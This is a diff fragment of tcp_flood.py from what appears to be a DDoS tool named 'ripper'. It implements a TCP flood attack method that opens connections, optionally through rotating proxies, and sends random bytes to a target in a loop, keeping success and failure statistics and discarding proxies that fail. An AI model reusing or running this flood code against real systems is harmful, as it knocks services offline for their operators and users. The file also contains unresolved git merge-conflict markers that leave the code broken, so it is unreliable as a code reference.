+++ ripper/actions/tcp_flood.py
@@ -3,7 +3,11 @@ from contextlib import suppress
 from typing import Any
 from socks import ProxyError
 
+<<<<<<< HEAD
 from ripper.errors import *
+=======
+from ripper.context.events_journal import EventsJournal
+>>>>>>> 8d03aaae91730f80fd6b1bf39562fb9c5ea28375
 from ripper.context.target import Target
 from ripper.common import generate_random_bytes
 from ripper.actions.attack_method import AttackMethod
@@ -11,6 +15,8 @@ from ripper.proxy import Proxy
 
 # Forward Reference
 Context = 'Context'
+
+Events = EventsJournal()
 
 
 class TcpFlood(AttackMethod):
@@ -37,14 +43,19 @@ class TcpFlood(AttackMethod):
 
     def __call__(self, *args, **kwargs):
         with suppress(Exception), self.create_connection() as tcp_conn:
+<<<<<<< HEAD
             self._target.stats.connect.status_success()
+=======
+            self._ctx.target.statistic.connect.status_success()
+            Events.info('Creating new TCP connection...')
+>>>>>>> 8d03aaae91730f80fd6b1bf39562fb9c5ea28375
             while self.send(tcp_conn):
                 if self._ctx.dry_run:
                     break
                 continue
 
             self._target.stats.connect.status_failed()
-            self._ctx.sock_manager.close_socket()
+            # self._ctx.sock_manager.close_socket()
 
     def send(self, sock: socket) -> bool:
         send_bytes = generate_random_bytes(
@@ -52,10 +63,15 @@ class TcpFlood(AttackMethod):
             self._ctx.max_random_packet_len)
         try:
             sent = sock.send(send_bytes)
-        except ProxyError:
+        except ProxyError as ep:
+            Events.exception(ep)
             self._ctx.proxy_manager.delete_proxy_sync(self._proxy)
         except Exception as e:
+<<<<<<< HEAD
             self._target.errors_manager.add_error(TcpSendError(message=e))
+=======
+            Events.exception(e)
+>>>>>>> 8d03aaae91730f80fd6b1bf39562fb9c5ea28375
         else:
             self._target.stats.packets.status_sent(sent_bytes=sent)
             self._proxy.report_success() if self._proxy is not None else 0